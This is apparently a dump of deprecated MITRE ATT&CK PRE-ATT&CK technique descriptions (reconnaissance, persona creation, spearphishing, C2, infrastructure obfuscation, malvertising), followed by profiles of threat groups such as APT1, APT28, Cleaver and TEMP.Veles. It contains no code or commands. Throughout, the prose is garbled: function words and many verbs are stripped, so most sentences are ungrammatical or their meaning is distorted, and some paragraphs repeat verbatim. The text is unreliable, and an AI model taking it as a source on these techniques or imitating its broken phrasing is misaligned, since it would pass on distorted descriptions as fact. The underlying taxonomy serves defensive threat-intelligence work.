Infrastructure services includes hardware, software, network resources required operate communications environment. infrastructure managed 3rd party managed owning organization. (Citation: FFIECAwareness) (Citation: Zetter2015Threats) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1288).

An adversary analyze technical scanning identify weaknesses configuration architecture victim network. weaknesses include  architectural flaws, misconfigurations, improper security controls. (Citation: FireEyeAPT28) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1270).

Personnel internally company belong maintain role  electronic specialized access, authorities, privilege attractive target adversary.  administrator. (Citation: RSA-APTRecon) **This technique deprecated. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190).**

The software, data, commands advantage weakness program unintended unanticipated behavior. weakness bug, glitch, design vulnerability. (Citation: GoogleCrawlerSQLInj) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1359).

An adversary code systems cyber security protections, antivirus products, code detected. malware freely public services. (Citation: MalwareQAZirtest) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1352).

Command Control (C2 C&C) method adversary communicates malware. adversary variety protocols methods execute C2 centralized server, peer peer, IRC, compromised sites, social media. (Citation: HAMMERTOSS2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1236).

Analysts assess current requirements outline baselining process satisfying requirement. (Citation: CyberAdvertisingChar) (Citation: CIATradecraft) (Citation: ForensicAdversaryModeling) (Citation: CyberAdversaryBehavior) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1315).

Technical network hiding techniques methods modifying traffic evade network signature detection utilize misattribution techniques. Examples include channel/IP/VLAN hopping, mimicking legitimate operations, seeding misinformation. (Citation: HAMMERTOSS2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1341).

For attacks incorporating social engineering utilization on-line persona important. personas fictitious impersonate real people. persona exist single multiple sites ([Facebook](https://www.facebook.com), [LinkedIn](https://www.linkedin.com), [Twitter](https://twitter.com), [Google+](https://plus.google.com), etc.). (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) (Citation: RobinSageInterview) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1241).

An adversary undergoes iterative target selection process broadly narrow specifics (strategic tactical) narrowly expand outward (tactical strategic).  process, adversary determine level target attack. country, government, commercial sector. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1297).

Understanding organizational skillsets deficiencies provide insight weakness defenses, opportunities exploitation. (Citation: FakeLinkedIn) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1351).

A remote access tool (RAT) piece software remote user control physical access system. adversary utilize existing RATs, modify existing RATs, create RAT. (Citation: ActiveMalwareEnergy) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1343).

For attacks incorporating social engineering utilization on-line persona important. Utilizing existing persona compromised accounts engender level trust potential victim relationship, knowledge of, compromised persona. (Citation: AnonHBGary) (Citation: Hacked Social Media Accounts) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1318).

Obfuscation hiding day-to-day building testing tools, chat servers, etc. (Citation: DellComfooMasters) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1358).

Execution code network communications result logging network forensic artifacts. adversary code identify recorded conditions. result code adding additional actions (such deleting record log) code. (Citation: EDB-39007) (Citation: infosec-covering-tracks) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1294).

An adversary probe victim's network determine configurations. configurations provide opportunities route traffic network undetected detectable way. (Citation: OSFingerprinting2014) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1259).

Network trusts enable communications networks specific accesses permissions. Network trusts include implementation domain trusts virtual private networks (VPNs). (Citation: CuckoosEgg) (Citation: CuckoosEggWikipedia) (Citation: KGBComputerMe) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1339).

Backup infrastructure adversary recover environmental failures. facilitates recovery movement infrastructure primary infrastructure discovered viable. (Citation: LUCKYCAT2012) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1257).

Technical blogs forums provide technical staff assistance troubleshoot problems. reveal operating (OS), network devices, applications use. (Citation: FunAndSun2012) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1279).

Social Engineering practice manipulating people divulge action. (Citation: SEAttackVectors) (Citation: BeachSE2003) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1253).

Passive scanning existing network traffic identify communications system. (Citation: SurveyDetectionStrategies) (Citation: CyberReconPaper) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1285).

Determining "corporate" desk exists, degree access control has, "edge" units support processes standards. (Citation: SANSCentratlizeManagement) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1228).

Leadership organizes Key Intelligence Topics (KITs) Key Intelligence Questions (KIQs) types categories creates necessary.  description key players KIT adversary assesses cyber defensive capabilities nation-state threat actor. (Citation: Herring1999) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1326).

Domain Registration Hijacking changing registration domain permission original registrant. (Citation: ICANNDomainNameHijacking) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1291).

Common Vulnerability Enumeration (CVE) dictionary publicly security vulnerabilities exposures. adversary target specific software vulnerable. (Citation: WeaponsVulnerable) (Citation: KasperskyCarbanak) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1239).

Applicable agencies personnel receive intelligence requirements evaluate determine sub-requirements topics, questions, requirements.  example, adversary's  nuclear energy requirements divided nuclear facilities nuclear warhead capabilities. (Citation: AnalystsAndPolicymaking) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1389).

Many applications third-party software libraries, knowledge behavior libraries application developer. example, mobile applications incorporate advertising libraries generate revenue application developer. Vulnerabilities third-party libraries exploited application library, vulnerabilities fixed, applications older, vulnerable versions library. (Citation: Flexera News Vulnerabilities) (Citation: Android Security Review 2015) (Citation: Android Multidex RCE) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1229).

Key Intelligence Topics (KITs) Key Intelligence Questions (KIQs) subdivided focus political, economic, diplomatic, military, financial, intellectual property categories.  adversary KITs KIQs manner understand pursuing multiple aspects types target purpose. (Citation: CompetitiveIntelligence) (Citation: CompetitiveIntelligence)KIT. object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1268).

Social Engineering practice manipulating people divulge action. (Citation: SEAttackVectors) (Citation: BeachSE2003) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1304).

Proxies intermediary clients seeking resources systems. proxy difficult track origin network communication. (Citation: APT1) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1397).

Spearphishing specific variant spearphishing. Spearphishing forms spearphishing leverage malicious code. forms spearphishing elctronically delivered social engineering targeted specific individual, company, industry. Spearphishing attempt trick targets divulging information, frequently credentials, involving malicious code. Spearphishing frequently involves masquerading source reason collect (such administrator bank) providing user link visit. closely resembles legitimate appearance URL elements real site. fake website, gathered forms attacker. Spearphishing exchange emails, instant messengers electronic conversation means. (Citation: ATTACKREF GRIZZLY STEPPE JAR) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1290).

If adversary identify security tools victim identify tools. (Citation: CrowdStrike Putter Panda) **This technique deprecated. [Hardware Additions](https://attack.mitre.org/techniques/T1200) appropriate.**

If adversary gain physical access target's environment introduce variety  devices provide compromise mechanisms. include installing keyboard loggers, adding routing/wireless equipment, connecting computing devices. (Citation: Credit Card Skimmers) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1232).

Implementation plans goals strategic plan executed. (Citation: ChinaCollectionPlan) (Citation: OrderOfBattle) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1275).

In addition target's social media presence exist larger digital footprint, accounts credentials e-commerce sites usernames logins email.  adversary familiar target's username determine target's larger digital footprint publicly sources. (Citation: DigitalFootprint) (Citation: trendmicro-vtech) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Social Engineering practice manipulating people divulge action. Human Intelligence (HUMINT) intelligence collected human sources. (Citation: 17millionScam) (Citation: UbiquityEmailScam) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1316).

Using alternative payment options adversary hide activities. Options include crypto currencies, barter systems, pre-paid cards accounts. (Citation: Goodin300InBitcoins) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1244).

The secondary level tactical element adversary seeks attack specific network network vulnerable attack.  corporate network example, secondary level tactical element SQL server domain controller vulnerability. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1240).

Once divided granular parts, analysts collection managers task collection management requirements sub-requirements. (Citation: Heffter) (Citation: JP2-01) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1313).

Obfuscation creating communications difficult understand.  Encryption transforms communications requires key reverse encryption. (Citation: FireEyeAPT28) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1248).

Job postings, company sites, forums, provide organizational structure provide contact organization. adversary  technologies organization valuable attack provide insight security weaknesses limitations detection protection mechanisms. (Citation: JobPostingThreat) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1242).

If strategic tactical vice versa,  adversary operational element.  example, specific company industry agency government. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1361).

An adversary planned method attack existing security products email filters intrusion detection sensors (IDS). (Citation: WiredVirusTotal) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1393).

Many mobile devices configured applications installed mainstream vendor app stores Apple App Store Google Play Store). adversary submit multiple code samples stores deliberately designed probe stores' security analysis capabilities, goal determining effective techniques malicious applications stores delivered targeted devices. (Citation: Android Bouncer) (Citation: Adventures BouncerLand) (Citation: Jekyll iOS) (Citation: Fruit Zombies) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1348).

As legitimate development efforts, skill sets required phases attack. skills located house, developed, contracted out. (Citation: APT1) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1317).

An adversary secure protect infrastructure defenders do. include VPNs, security software, logging monitoring, passwords, defensive measures. (Citation: KrebsTerracottaVPN) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1252).

A network topology arrangement elements network servers, workstations, printers, routers, firewalls, etc.). Mapping network adversary understand elements connected related. (Citation: traceroute) (Citation: Shodan Tutorial) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1394).

An adversary distribute malicious software development tools compiler) hide malicious behavior software built tools. (Citation: XcodeGhost) (Citation: Reflections Trusting Trust) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1224).

Leadership assesses generates Key Intelligence Topics (KIT) Key Intelligence Questions (KIQ). example, adversary closed source reporting cyber interest, KIT. (Citation: ODNIIntegration) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1306).

Anonymity services reduce track adversary's activities.  Multiple options hide activity, limit tracking, increase anonymity. (Citation: TOR Design) (Citation: Stratfor2012) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1245).

The approach attack vector outlines specifics adversary attack target.  additional phases PRE-ATT&CK, adversary update approach attack vector. (Citation: CyberAdversaryBehavior) (Citation: WITCHCOVEN2015) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1392).

The adversary Apple iOS enterprise distribution key pair certificate distribute malicious apps Apple iOS devices publish apps Apple App Store (where apps detected). (Citation: Apple Developer Enterprise Porgram Apps) (Citation: Fruit Zombies) (Citation: WIRELURKER) (Citation: Sideloading Change) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1296).

An adversary assess target's operational security (OPSEC) practices identify targeting options. target share settings cautious environments. (Citation: Scasny2015) (Citation: EverstineAirStrikes) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Exploits spread advertising (malvertising) involve injecting malicious malware-laden advertisements legitimate online advertising networks webpages. (Citation: TPMalvertising) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1225).

Leadership identifies gap generate compelling generate Key Intelligence Topic (KIT) Key Intelligence Question (KIQ). (Citation: ODNIIntegration) (Citation: ICD115) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1243).

From tactical viewpoint, adversary primary secondary level target.  primary target represents level tactical element adversary wishes attack.  example, corporate network corporation division agency. (Citation: CyberAdversaryBehavior) (Citation: JP3-60) (Citation: JP3-12R) (Citation: DoD Cyber 2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1353).

After compromise, adversary utilize additional tools facilitate goals. include tools explore system, laterally network, exfiltrate data, destroy data. (Citation: SofacyHits) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1284).

A wide variety cloud, virtual private services, hosting, compute, storage solutions 3rd party infrastructure services. services provide adversary avenue approach compromise. (Citation: LUCKYCAT2012) (Citation: Schneier-cloud) (Citation: Computerworld-suppliers) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1357).

Malware perform platforms (computer handheld) operating systems ([Ubuntu](http://www.ubuntu.com) [OS X](http://www.apple.com/osx)), versions ([Windows](http://windows.microsoft.com) 7 10) malicious actors malware environment(s) expect executed. (Citation: BypassMalwareDefense) **This technique deprecated. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).**

Emails malicious attachments designed user open/execute attachment deliver malware payloads. (Citation: APT1) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1299).

During mergers, divestitures, period change joint infrastructure business processes opportunity exploitation. type churn, unusual requests, standard practices noticeable. (Citation: RossiMergers) (Citation: MeidlHealthMergers) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1337).

Certificates designed instill trust.  include key, owner's identity, digital signature entity verified certificate's contents correct. signature valid, person examining certificate trusts signer, key communicate owner. Acquiring certificate  domain expected trusted adversary trick user trusting domain vvachovia [Wachovia](https://www.wellsfargo.com/about/corporate/wachovia) -- homoglyphs). (Citation: SubvertSSL) (Citation: PaypalScam) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1334).

Instead buying, leasing, renting infrastructure adversary compromise infrastructure attack cycle. (Citation: WateringHole2014) (Citation: FireEye Operation SnowMan) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1310).

Code signing process digitally signing executables scripts confirm software author guarantee code altered corrupted. Users trust signed piece code unsigned piece code issued certificate author is. (Citation: Adobe Code Signing Cert) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1309).

Obfuscation hiding day-to-day building testing tools, chat servers, etc. (Citation: LUCKYCAT2012) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1234).

Analysts receive Key Intelligence Topics (KITs) Key Intelligence Questions (KIQs) leadership key decision makers generate intelligence requirements articulate intricacies required topic question. (Citation: Herring1999) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1362).

An adversary stage software tools stages attack. software tools systems legitimately adversary compromised infrastructure. (Citation: APT1) (Citation: RedOctober) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1355).

Use removable media Launch phase requires adversary determine type, format, content media malware. (Citation: BadUSB) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1364).

A form social engineering designed build trust lay foundation future interactions attacks. (Citation: BlackHatRobinSage) **This technique deprecated. [Spearphishing Service](https://attack.mitre.org/techniques/T1566/003).**

Sending messages social media platforms individuals identified target. messages include malicious attachments links malicious sites designed establish communications future actions. (Citation: APT1) (Citation: Nemucod Facebook) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1231).

Strategic plans outline mission, vision, goals adversary level relation key partners, topics, functions adversary carries out. (Citation: KPMGChina5Year) (Citation: China5YearPlans) (Citation: ChinaUN) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1295).

Social media insight target's affiliations organizations.  Certification explain technical associations professional associations. Personal provide data exploitation blackmail. (Citation: Scasny2015) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1255).

Email addresses, logon credentials, forms online identification typically share common format. guessing credentials domain easier. email address first.last@company.com company email format. (Citation: RSA-APTRecon) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1261).

Software applications built technologies, languages, dependencies. reveal vulnerabilities opportunities adversary. (Citation: CommonApplicationAttacks) (Citation: WebApplicationSecurity) (Citation: SANSTop25) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Upon successful compromise adversary implement methods confirming success including communication command control server, exfiltration data, verifiable intended publicly accessible resource inaccessible defaced. (Citation: FireEye Malware Stages) (Citation: APTNetworkTrafficAnalysis) **This technique deprecated. ATT&CK's Initial Access Execution tactics replacement techniques.**

Through social engineering methods, adversary users perform physical actions provide access adversary.  include providing password phone inserting 'found' USB system. (Citation: AnonHBGary) (Citation: CSOInsideOutside) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1345).

A payload malware performs malicious action. adversary create custom payloads exist capability targeting specific environment. (Citation: APT1) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/techniques/T1293).

An adversary probe victim's network determine configurations. configurations provide opportunities route traffic network undetected detectable way. (Citation: Li2014ExploitKits) (Citation: RecurlyGHOST) [APT17](https://attack.mitre.org/groups/G0025) China-based threat conducted network intrusions U.S. government entities, defense industry, law firms, technology companies, mining companies, non-government organizations. (Citation: FireEye APT17) [Night Dragon](https://attack.mitre.org/groups/G0014) campaign activity involving threat conducted activity originating China. (Citation: McAfee Night Dragon) [APT1](https://attack.mitre.org/groups/G0006) Chinese threat attributed 2nd Bureau People’s Liberation Army (PLA) Staff Department’s (GSD) 3rd Department, commonly Military Unit Cover Designator (MUCD) Unit 61398. (Citation: Mandiant APT1) [Cleaver](https://attack.mitre.org/groups/G0003) threat attributed Iranian actors responsible activity tracked Operation Cleaver. (Citation: Cylance Cleaver) Strong circumstantial evidence suggests Cleaver linked Threat 2889 (TG-2889). (Citation: Dell Threat 2889) [TEMP.Veles](https://attack.mitre.org/groups/G0088) Russia-based threat targeted critical infrastructure. observed utilizing TRITON, malware framework designed manipulate industrial safety systems.(Citation: FireEye TRITON 2019)(Citation: FireEye TEMP.Veles 2018)(Citation: FireEye TEMP.Veles JSON April 2019) [APT28](https://attack.mitre.org/groups/G0007) threat attributed Russia's Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020) active 2004.(Citation: DOJ GRU Indictment Jul 2018) (Citation: Ars Technica GRU indictment Jul 2018) (Citation: Crowdstrike DNC June 2016) (Citation: FireEye APT28) (Citation: SecureWorks TG-4127) (Citation: FireEye APT28 January 2017) (Citation: GRIZZLY STEPPE JAR) (Citation: Sofacy DealersChoice) (Citation: Palo Alto Sofacy 06-2018) (Citation: Symantec APT28 Oct 2018) (Citation: ESET Zebrocy 2019)

[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised Hillary Clinton campaign, Democratic National Committee, Democratic Congressional Campaign Committee 2016 attempt interfere U.S. presidential election. (Citation: Crowdstrike DNC June 2016) 2018, indicted GRU Unit 26165 officers [APT28](https://attack.mitre.org/groups/G0007) cyber operations (including close-access operations) conducted 2014 2018 Anti-Doping Agency (WADA), Anti-Doping Agency, nuclear facility, Organization Prohibition Chemical Weapons (OPCW), Spiez Swiss Chemicals Laboratory, organizations.(Citation: District Court Indictment GRU Oct 2018) conducted assistance GRU Unit 74455, referred [Sandworm Team](https://attack.mitre.org/groups/G0034).  [APT16](https://attack.mitre.org/groups/G0023) China-based threat launched spearphishing campaigns targeting Japanese Taiwanese organizations. (Citation: FireEye EPS Awakens 2) [Night Dragon](https://attack.mitre.org/groups/G0014) servers China, U.S., Netherlands attempt hide operations.(Citation: McAfee Night Dragon) [APT1](https://attack.mitre.org/groups/G0006) dynamic DNS register hundreds FQDNs.(Citation: Mandiant APT1) [TEMP.Veles](https://attack.mitre.org/groups/G0088) dynamic DNS.(Citation: FireEye TRITON 2019) [APT1](https://attack.mitre.org/groups/G0006) publicly privilege escalation tools.(Citation: Mandiant APT1) [TEMP.Veles](https://attack.mitre.org/groups/G0088) Virtual Private Server (VPS) infrastructure.(Citation: FireEye TRITON 2019) [APT1](https://attack.mitre.org/groups/G0006) party email services registration whois records.(Citation: Mandiant APT1) [APT28](https://attack.mitre.org/groups/G0007) registered domains imitating NATO, OSCE security websites, Caucasus resources organizations.(Citation: FireEye APT28) (Citation: District Court Indictment GRU Oct 2018) [APT16](https://attack.mitre.org/groups/G0023) spearphished journalists, targeting contact DPP politicians.(Citation: FireEye EPS Awakens 2) [APT17](https://attack.mitre.org/groups/G0025) posted forum threads created profile TechNet.(Citation: FireEye APT17) [APT17](https://attack.mitre.org/groups/G0025) created biographical sections TechNet profile legitimate.(Citation: FireEye APT17) [APT28](https://attack.mitre.org/groups/G0007) reused SOURFACE downloader payload lure document.(Citation: FireEye APT28) [APT1](https://attack.mitre.org/groups/G0006) compromised vast set 3rd party victim hop network infrastructure. example, [APT1](https://attack.mitre.org/groups/G0006) hijacked FQDNs legitimate websites hosted hop points. Mandiant considers “hijacked” originally registered legitimate reason APT1 malicious purposes.(Citation: Mandiant APT1) [APT17](https://attack.mitre.org/groups/G0025) obfuscated infrastructure multi-layered malware beaconing approach. (Citation: FireEye APT17) [Night Dragon](https://attack.mitre.org/groups/G0014) privately developed customized remote access tools.(Citation: McAfee Night Dragon) [Cleaver](https://attack.mitre.org/groups/G0003) created fake LinkedIn profiles.(Citation: Dell Threat 2889) [Cleaver](https://attack.mitre.org/groups/G0003) created customized tools payloads functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, backdoors, process enumeration, WMI querying, SMB communications, network interface sniffing, keystroke logging.(Citation: Cylance Cleaver) [Night Dragon](https://attack.mitre.org/groups/G0014) party hosting services U.S. attempt hide operations.(Citation: McAfee Night Dragon) [Cleaver](https://attack.mitre.org/groups/G0003) fake personas included profile photos, details, network connections.(Citation: Dell Threat 2889) [APT1](https://attack.mitre.org/groups/G0006) hijacked FQDNs legitimate websites hosted hop points. Mandiant considers “hijacked” originally registered legitimate reason APT1 malicious purposes.(Citation: Mandiant APT1) [Cleaver](https://attack.mitre.org/groups/G0003) zhCat encrypt traffic inline obfuscation detection difficult. zhCat message traffic benign.(Citation: Cylance Cleaver) [APT16](https://attack.mitre.org/groups/G0023) compromised legitimate sites staging servers second-stage payloads.(Citation: FireEye EPS Awakens 2) object deprecated content merged enterprise domain. [PRE](http://attack.mitre.org/matrices/enterprise/pre/) matrix replacement. prior content preserved [here](https://attack.mitre.org/versions/v7/matrices/pre/).

